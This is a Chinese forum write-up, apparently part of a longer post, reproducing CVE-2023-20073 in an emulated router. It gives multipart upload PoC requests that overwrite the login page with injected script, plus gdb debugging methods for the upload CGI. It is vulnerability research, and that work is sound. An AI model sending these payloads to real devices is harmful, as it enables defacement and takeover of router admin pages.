
![图片描述](https://bbs.kanxue.com/upload/attach/202308/953233_GJJ92MC4CS582HZ.png)

刚刚发送的报文如下

### POC

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18 | `-``-``-``-``-``-``-``-``-``-``-``-`  `Content``-``Disposition: form``-``data; name``=``"pathparam"`    `Portal`  `-``-``-``-``-``-``-``-``-``-``-``-`  `Content``-``Disposition: form``-``data; name``=``"fileparam"`    `login.html`  `-``-``-``-``-``-``-``-``-``-``-``-`  `Content``-``Disposition: form``-``data; name``=``"file.path"`    `/``tmp``/``upload``/``0000000001`  `-``-``-``-``-``-``-``-``-``-``-``-`  `Content``-``Disposition: form``-``data; name``=``"what"``;filename``=``"login.html"``;Content``-``Type``: application``/``octet``-``stream`    `<title>test<``/``title>`  `<script>alert(``'debug'``)<``/``script>`  `-``-``-``-``-``-``-``-``-``-``-``-` |

![image-20230801144712953](https://bbs.kanxue.com/upload/attach/202308/953233_V25WYFZEQZ9R6NY.jpg)

继续调试，发现可以成功走到 `system` 函数，并执行 `mv` 命令（如下）

![图片描述](https://bbs.kanxue.com/upload/attach/202308/953233_MEMT8C4ZA4D6NF5.png)

此时刷新路由器登录界面，发现已经被篡改掉了（如下）

![图片描述](https://bbs.kanxue.com/upload/attach/202308/953233_N8HJUNX83RMWMVQ.png)

## 控制`file.path`字段-方法二

这里是 **winmt** 师傅使用的一种比较优雅控制 `file.path` 的方法，上面提到的方法 `file.path` 字段是我们主动发过去的，其实报文会根据配置文件来自动来添加一个 `xxx.path` ，配置文件分析这里其实就说了这个地方（如下图）

![image-20230801151915836](https://bbs.kanxue.com/upload/attach/202308/953233_5NGZ4NP7JPAWFV5.jpg)

这里的 `$upload_file_name` 就是报文中 `Content-Disposition: form-data; name="what";filename="login.html"` 的 `name` 字段，然后在 `upload_set_form_field $upload_field_name.path "$upload_tmp_path"` 这行代码，会把上传文件的路径记录到这个 `xxx.path` 字段，这个 `xxx` 也就是上面的 `name` 字段的值。

验证的话，只需要看一下上面那次 `POST` 报文的数据就会发现 `what.path` 字段的值就是 `/tmp/upload/00000000001` （如下图）

![image-20230801153655724](https://bbs.kanxue.com/upload/attach/202308/953233_H4CA4W33B7USWHE.jpg)

所以实际上报文也可以这么写（如下），这样不需要手动传入 `file.path` 字段，这个的优点是不知道文件的上传路径依然也能够攻击成功。这次就不再调试了，执行流什么的和上面一样

### POC

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9  10  11  12  13  14 | `-``-``-``-``-``-``-``-``-``-``-``-`  `Content``-``Disposition: form``-``data; name``=``"pathparam"`    `Portal`  `-``-``-``-``-``-``-``-``-``-``-``-`  `Content``-``Disposition: form``-``data; name``=``"fileparam"`    `login.html`  `-``-``-``-``-``-``-``-``-``-``-``-`  `Content``-``Disposition: form``-``data; name``=``"file"``;filename``=``"login.html"``;Content``-``Type``: application``/``octet``-``stream`    `<title>The website has been hacked!<``/``title>`  `<script>alert(``'The website has been hacked'``)<``/``script>`  `-``-``-``-``-``-``-``-``-``-``-``-` |

攻击效果

![image-20230801154927968](https://bbs.kanxue.com/upload/attach/202308/953233_7U7JRMUM8CMKRXR.jpg)

# 调试方法

因为 `upload.cgi` 进程被调用是一闪而逝的，想正常查看进程号来附加进程调试是不可能的，所以下面介绍三种可以调试 `upload.cgi` 的方法

## 方法1-爆破

这个原理很好理解，就是写一个 `shell` 脚本不断的去捕获 `upload.cgi` 进程号，如果捕获到了就立刻去执行 `gdbserver` ，缺点是全凭概率，大概率是捕获不到的（感觉有三成的几率用循环能捕获到该进程），并且没法控制断点位置，因为我们无法干预捕获到进程号并加载调试的时间，有可能 `upload.cgi` 都快执行完才加载上去啥的，就随机性很大，大概率看不到自己想要的，但也算是一种调试方法。

|  |  |

| --- | --- |

| 1  2  3  4  5  6  7  8  9 | `while` `true; do`  `PID``=``$(pidof upload.cgi)`  `if` `[` `-``n` `"$PID"` `]; then`  `echo` `"upload.cgi process ID is：$PID"`  `.``/``gdbserver` `0.0``.``0.0``:``9999` `-``-``attach $PID`  `else`  `echo` `"No get upload.cgi process ID"`  `fi`  `done` |

使用上面的爆破脚本开始运行，然后 `gdb` 执行 `target remote 192.168.45.66:9999` ，接着发送报文，此时会触发 `upload.cgi` 进程，如果运气好的话爆破脚本此时正好会捕捉到进程号，开启调试

下图为爆破成功的情况

![image-20230801170242715](https://bbs.kanxue.com/upload/attach/202308/953233_DRRRVJHKW7388JA.jpg)

## 方法2-死循环

该方法对于这种 `fork` 子进程启动 `cgi` 最稳定的调试方法 -- 也是 **winmt** 最爱的调试方法

在 `upload.cgi` 的 `main` 函数起始位置，将首次进行跳转的指令给改成跳到本条指令地址的指令，使程序陷入死循环

![image-20230801105851693](https://bbs.kanxue.com/upload/attach/202308/953233_6J4794VW2XJTWBF.jpg)

上面 `getenv` 函数跳转时，正常的汇编代码应该如下

![image-20230801110045838](https://bbs.kanxue.com/upload/attach/202308/953233_E2KR9ZNWBY2NPZK.jpg)

然后现在把 `0x10E0C` 这个地址存放的指令 `BL getenv` 改成 `B 0x10E0C` 这样就可以让进程 `upload.cgi` 陷入死循环（使用插件 `keypatch` 进行修改）

![image-20230801110224722](https://bbs.kanxue.com/upload/attach/202308/953233_R6S2F6XVPMN82HT.jpg)

此时改完之后查看伪代码应该是这样的，如下

![image-20230801110405979](https://bbs.kanxue.com/upload/attach/202308/953233_4R2SZAG3VESBKDV.jpg)

然后将 `patch` 完的文件保存后，放到 `/www/cgi-bin` 目录下（记得把原本正常的 `upload.cgi` 备份），直接重启 `nginx` 服务，然后发送攻击报文的话，路由器的界面会出现 `502` 错误（如下）

![图片描述](https://bbs.kanxue.com/upload/attach/202308/953233_54SMNQJC3ZUPSVP.png)

`nginx` 服务本身会报一个 `Permission denied` 的错误，这是因为传进来的 `upload.cgi` 属于 `root` 用户，但是启动 `upload.cgi` 进程的用户是 `www-data`（`ps -ef` 可以查看），它的 `uid` 是 `33`，权限不够。

![image-20230729133739275](https://bbs.kanxue.com/upload/attach/202308/953233_9WFT9V7J8N36HZD.jpg)

**解决方法是把其他用户组的访问权限设置为 `7`** ，这里图方便直接执行了 `chmod 777 upload.cgi` （之前我还纳闷为什么可以成功的单独运行 upload.cgi 程序，却服务启动的时候说权限不够，现在知道了单独运行 `upload.cgi` 是因为执行的用户本身就是 `root` ，以前对于 `linux` 上的权限设置有些一知半解，这里要特别感谢 **winmt** 师傅帮我解决了这个问题并且还要感谢我的同学 [timochan](https://bbs.kanxue.com/elink@8c9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2@1K9h3#2G2j5$3S2S2L8W2)9J5k6h3y4F1i4K6u0r3) 帮助我彻底理解了这里）

然后重启 `nginx` 服务，发送攻击报文，此时正常的话服务是卡住的，访问路由器登录界面没反应，并且也能看到 `upload.cgi` 的进程号

![图片描述](https://bbs.kanxue.com/upload/attach/202308/953233_PPS52P3HQ2W3KP5.png)

用 `gdb.server + gdb` 实现远程调试 [gdbserver 下载链接](https://bbs.kanxue.com/elink@6e6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6N6r3q4&6L8r3W2$3x3#2)9J5c8X3N6V1j5W2)9J5k6s2y4@1j5i4c8A6j5#2)9J5k6r3y4J5L8%4y4K6i4K6u0r3j5X3I4G2j5W2)9J5c8X3#2S2M7%4c8W2M7W2)9J5c8Y4m8J5k6h3u0#2K9h3I4@1i4K6u0r3k6$3c8T1M7$3g2J5N6X3g2J5i4K6u0V1y4#2)9J5k6e0N6Q4x3X3f1I4i4K6u0V1j5i4u0E0K9r3k6Q4x3X3c8W2j5h3u0A6y4g2)9J5k6s2j5I4i4K6u0V1M7%4W2K6N6R3`.`.) 。下载后需要用 `scp` 传入到 `qemu` 中。执行命令 `./gdbserver 0.0.0.0:9999 --attach PID`

在宿主机中执行 `sudo gdb-multiarch upload.cgi` 这里也设置 `upload.cgi` 是为了加载出来程序的符号

执行 `set endian little` 设置一下字节序，执行 `set architecture arm` 设置一下架构再执行 `target remote 192.168.45.66:9999` 就可以附加 `upload.cgi` 进程进行调试了。

一切正常的话，界面应该如下

![image-20230801125049024](https://bbs.kanxue.com/upload/attach/202308/953233_WQDYFGN7DNTQECD.jpg)

因为我们通过 `patch` 让进程陷入了死循环，所以要用 `set` 命令给改回正常的指令，查看之前备份的 `upload.cgi` 文件，发现这里原本机器码为 **AA FF FF EB** ，因此执行 `set *0x10e0c=0xebffffaa` 命令（因为小端序，这里是反着输入的）

![图片描述](https://bbs.kanxue.com/upload/attach/202308/953233_ZBJHNQ8F59SS2NP.png)

至此就可以正常来调试 `upload.cgi` 进程（如下）

![图片描述](https://bbs.kanxue.com/upload/attach/202308/953233_MWJYVWWGJ54KXYM.png)

还有一个坑，调试的时候会发现，调试几分钟，就会出现右下角的报错（如下图）

![image-20230801125411430](https://bbs.kanxue.com/upload/attach/202308/953233_ACDDM8VNJ6X4EDX.jpg)

原因是在 `uwsgi` 的配置文件中设置了时间限制（如下图），解决方法就把这个值改的很大即可

![图片描述](https://bbs.kanxue.com/upload/attach/202308/953233_WZ7SW34TZSH9V3Q.png)

## 方法3-父进程

该方法在这里没有实验成功，但理论上可行。去找到调用 `upload.cgi` 的进程（也就是 `uwsgi -m --ini /etc/uwsgi/upload.ini` ），调试 `upload.cgi` 的父进程，等到 `fork` 创建子进程，切换到子进程，并用 `catch exec` 命令捕获新事件，在执行 `execvp` 后即可跳转到 `upload.cgi` 上调试（`upload.cgi` 进程会替代原本的子进程 ），理论上是这个样子。失败原因：`gdb` 加载进程调试后，似乎出现了一些问题。第一是 `fork` 后子进程没出来（`gdb` 上看不到）；第二 `execvp` 这里执行后不支持 `catch exec` ；第三是 `gdb` 挂上来后，有些指令会导致进程的崩溃

# 尾声

**CVE-2023-20073** 的复现结束了，在这个过程中有过惊喜、不解、困惑各样的情绪。还记得当时我做了两天，启动服务这块还是失败的。后来用的网上找的内核镜像和磁盘映像文件（里面有一个老版本固件解出来的文件系统），直到整个复现过程的结束，我用的都不是自己解压出来的文件系统。这个点一个星期都在抽空不断的尝试，但都没有成功。第八天，不知什么时候我尝试了 `scp` 应该传压缩后的文件系统，并且 `binwalk` 要保留文件的软链接，这一次我成功将服务启动成功，用的是我自己解压出来的最新固件。当时我给 **winmt** 说现在的心情就和中了五百万一样，可实际上我只不过是成功的解压了一个固件启动了服务而已，这种心情很奇怪，可能只有各位亲自遇见了困扰自己许久的问题最终还是被自己给解决掉才能体会到（也不希望各位花费一个星期只为体会到这种心情，哈哈~）

如果结尾只写一句话的话，应该是 “感谢 **winmt** 和坚持的 **ZIKH26** ，他教会了我很多，不止技术，还有态度”

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 2023-8-3 10:33

被ZIKH26编辑

，原因：

[#安全研究](https://bbs.kanxue.com/forum-128-1-167.htm)

[#固件分析](https://bbs.kanxue.com/forum-128-1-170.htm)

[#漏洞分析](https://bbs.kanxue.com/forum-128-1-171.htm)

[#家用设备](https://bbs.kanxue.com/forum-128-1-173.htm)

[#工控设备](https://bbs.kanxue.com/forum-128-1-174.htm)
